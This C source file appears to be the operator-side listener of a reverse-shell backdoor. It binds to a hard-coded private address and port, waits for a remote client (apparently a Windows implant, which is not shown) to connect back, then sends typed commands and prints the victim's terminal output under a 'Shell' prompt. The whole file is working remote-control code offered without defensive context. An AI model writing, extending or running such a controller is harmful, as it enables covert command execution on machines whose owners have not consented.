#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int main() {
	int sock, client_socket; //we need to keep track of our socket and the socket we are connecting to
	char buffer[1024];
	char response[18384]; //must be the same size of the response buffer on the client applciation
	struct sockaddr_in server_address, client_address;
	int i=0;
	int optval = 1;
	socklen_t client_length;

	sock = socket(AF_INET, SOCK_STREAM, 0);

	//we want to make sure there is no error creating the TCP socket
	if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) {
		printf("Error Setting the TCP Socket Options\n");
		return 1;
	}

	server_address.sin_family = AF_INET;
	server_address.sin_addr.s_addr = inet_addr("192.168.2.191");
	server_address.sin_port = htons(50005);

	bind(sock, (struct sockaddr *) &server_address, sizeof(server_address));
	listen(sock, 5); //the socket we are listening on, the # of connections we will allow
	client_length = sizeof(client_address);
	client_socket = accept(sock, (struct sockaddr *) &client_address, &client_length);

	while (1) {
		jump:
		bzero(&buffer, sizeof(buffer));
		bzero(&response, sizeof(response));
		printf("* Shell#%s-$: ", inet_ntoa(client_address.sin_addr));
		fgets(buffer, sizeof(buffer), stdin);
		strtok(buffer, "\n");
		write(client_socket, buffer, sizeof(buffer));

		if (strncmp("q", buffer, 1) == 0) {
			break; //no need to call WSACleanuop, etc. THIS SHOULD BE RUN IN A UNIX ENVIORNMENT
		} else {
			recv(client_socket, response, sizeof(response), MSG_WAITALL); //MSG_WAITALL FLAG - block the operation untill the full request is satisfied
			printf("%s", response); //print the contents of the clients terminal response
		}
	}
}
